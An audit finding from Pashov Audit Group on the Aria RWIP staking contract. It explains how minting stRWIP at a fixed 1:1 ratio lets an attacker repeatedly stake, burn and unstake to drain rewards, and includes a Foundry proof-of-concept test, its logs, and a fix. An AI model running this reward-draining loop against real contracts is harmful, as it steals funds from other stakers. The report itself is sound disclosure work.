---
tags:
  - lang/solidity
  - sector/staking
  - sector/staking-pool
  - sector/token
  - sector/vault
  - platform/pashov
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/reward-theft
protocol: "[[Aria]]"
auditors:
  - "[[Pashov Audit Group]]"
report: "https://github.com/pashov/audits/blob/master/team/md/Aria-security-review_2025-05-12.md"
genome:
  - "[[reward-calculation]]"
  - "[[reward-theft]]"
  - "[[reward-accounting]]"
  - "[[timestamp-dependence]]"
---
# [H-01] stRWIP is always minted for RWIP in a 1:1 ratio

- id: 63676
- impact: HIGH
- protocol: Aria_2025-05-12
- reporter: Pashov Audit Group
- source: https://github.com/pashov/audits/blob/master/team/md/[[Aria]]-security-review_2025-05-12.md

## Summary


This bug report describes a vulnerability in the RWIP staking system where an attacker can steal most of the staking rewards by manipulating the exchange rate between stRWIP and RWIP tokens. The attacker can repeatedly stake, burn, and unstake tokens to receive more RWIP than they initially staked. This renders RWIP staking useless and can be done as long as there are rewards to steal. The report recommends using the current exchange rate for calculating the amount of stRWIP to mint instead of a fixed 1:1 ratio. This fix has been implemented in a pull request on the project's GitHub page.

## Details


## Severity

**Impact:** High

**Likelihood:** Medium

## Description

For staking RWIP, users always receive stRWIP in a 1:1 ratio. For burning 1 stRWIP, they receive RWIP according to the current exchange rate, which is going to be above 1:1 because of rewards deposited into RWIPStaking. Therefore, the attacker can:

1. Call `stake` for 1000 RWIP.
2. Wait `minStakingHoldPeriod`.
3. Call `burnTicket`, receiving 1000 stRWIP.
4. Call `unstake` for 1000 stRWIP and receive >1000 RWIP (according to the current stRWIP/RWIP exchange rate).

The attack can be repeated for as long as there are any rewards to steal. As a result, the attacker will steal most of the staking rewards from the contract, rendering RWIP staking useless.

### Proof of Concept 

```solidity
    function test_bob_steals_rewards() public {
        assertEq(stakedRWIPToken.balanceOf(alice), 0);
        assertEq(rwipToken.balanceOf(alice), 1000e18);
        assertEq(rwipToken.balanceOf(bob), 1000e18);

        assertEq(rwipToken.allowance(alice, address(rwipStaking)), type(uint256).max);

        // alice stakes 1000e18 RWIP
        vm.prank(alice);
        rwipStaking.stake(1000e18, 1 days);
        vm.warp(block.timestamp + 1 days + 1);
        vm.prank(alice);
        rwipStaking.burnTicket(0);

        // RWIP rewards are deposited into rwipStaking when only Alice is staking
        deal(address(rwipToken), address(this), 500e18);
        rwipToken.transfer(address(rwipStaking), 500e18);

        // Bob stakes and unstakes 10 times, draining rewards
        vm.startPrank(bob);
        for (uint i = 1; i < 11; i++) {
            rwipStaking.stake(rwipToken.balanceOf(bob), 1 days);
            vm.warp(block.timestamp + 1 days + 1);
            rwipStaking.burnTicket(i);

            rwipStaking.unstake(stakedRWIPToken.balanceOf(bob), "");
            emit log_named_uint("Bob's balance", rwipToken.balanceOf(bob));
        }
        vm.stopPrank();

        // Alice unstakes and receives ~0.078e18 out of 500e18 of RWIP rewards
        vm.prank(alice);
        rwipStaking.unstake(1000e18, "");
        emit log_named_uint("Alice's balance", rwipToken.balanceOf(alice));
    }
```


```
Logs:
  Bob's balance: 1000000000000000000000
  Bob's balance: 1250000000000000000000
  Bob's balance: 1388888888888888888750
  Bob's balance: 1453488372093023255410
  Bob's balance: 1481042654028436018483
  Bob's balance: 1492359121298949378965
  Bob's balance: 1496934278597432457104
  Bob's balance: 1498772205809001265183
  Bob's balance: 1499508641008514329080
  Bob's balance: 1499803417766426517913
  Bob's balance: 1499921360922952441247
  Alice's balance: 1000078639077047558000
```

## Recommendations

RWIPStaking#burnTicket should use current stRWIP/RWIP exchange rate for calculating the amount of stRWIP to mint, instead of always minting 1 stRWIP per 1 RWIP. 

This mitigation would enable [the first depositor attack](https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks), which should be properly mitigated via virtual shares and decimal offset.

## Fix

[PR 51: mint stRWIP according to dynamic ratio](https://github.com/AriaProtocol/main-contracts/pull/51)
